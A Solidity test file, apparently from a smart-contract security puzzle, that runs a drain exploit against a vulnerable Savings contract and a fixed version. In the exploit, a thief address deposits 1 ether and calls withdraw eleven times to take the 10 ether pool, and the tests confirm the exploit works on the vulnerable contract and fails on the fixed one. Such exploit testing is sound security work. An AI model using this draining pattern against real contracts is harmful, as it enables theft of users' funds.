// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Savings} from "../src/Savings.sol";
import {SavingsFixed} from "../src/SavingsFixed.sol";
interface Vm { function prank(address) external; function prank(address, address) external; function deal(address, uint256) external; function addr(uint256) external returns (address); function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32); function expectRevert() external; function warp(uint256) external; }
Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
interface IR { function deposit() external payable; function withdraw() external; }
contract Puzzle004Test {
    address thief = address(0xBAD);
    function _deploy(bool f) internal returns (IR r) { vm.warp(30 days); r = f ? IR(address(new SavingsFixed())) : IR(address(new Savings())); r.deposit{value: 10 ether}(); }
    function _exploit(IR r) internal { vm.deal(thief, 1 ether); vm.prank(thief); r.deposit{value: 1 ether}(); for (uint i; i < 11; i++) { vm.prank(thief); r.withdraw(); } }
    function test_exploitWorksOnVulnerable() public { IR r = _deploy(false); _exploit(r); require(thief.balance == 11 ether, "drained"); }
    function test_exploitFailsOnFixed() public { IR r = _deploy(true); try this.exploitExt(r) {} catch {} require(address(r).balance >= 10 ether, "safe"); }
    function exploitExt(IR r) external { _exploit(r); }
    function _normal(IR r) internal { address u = address(0xB0B); vm.deal(u, 2 ether); vm.prank(u); r.deposit{value: 2 ether}(); vm.prank(u); r.withdraw(); require(u.balance == 2 ether, "ok"); }
    function test_normalUseVulnerable() public { _normal(_deploy(false)); }
    function test_normalUseFixed() public { _normal(_deploy(true)); }
}
